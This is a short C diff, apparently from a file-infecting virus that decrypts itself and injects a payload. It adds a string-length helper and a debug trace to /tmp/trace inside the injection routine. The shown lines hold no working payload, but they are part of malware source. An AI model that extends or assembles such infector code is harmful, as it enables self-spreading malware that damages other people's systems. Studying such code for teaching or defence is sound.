@@ -133,6 +133,19 @@ __attribute__((always_inline)) static inline int _munmap(void *addr, size_t leng
 /// STATIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
+__attribute__((always_inline)) static inline size_t _strlen(const char *str)
+{
+	size_t ret = 0;
+
+	if (str == NULL)
+		return 0;
+
+	while (str[ret])
+		ret++;
+
+	return ret;
+}
+
 __attribute__((always_inline)) static inline void write_on_memory(const struct s_host *host, char *ptr, const size_t payload_size)
 {
 	char *dst = ptr;
@@ -169,7 +182,23 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 {
 	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
-	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
+#if DEBUG
+	char function[] = "injection:\t\t";
+	char name[] = "/tmp/trace";
+	int trace = _open(name, O_RDWR | O_APPEND, 0000);
+	char newline = 0xa;
+	char result = context + 48;
+	
+	if (trace > 0)
+	{
+		_write(trace, function, _strlen(function));
+		_write(trace, &result, 1);
+		_write(trace, &newline, 1);
+	}
+
+	_close(trace);
+#endif
+
 	if (context == FAILURE)
 		goto label;
 
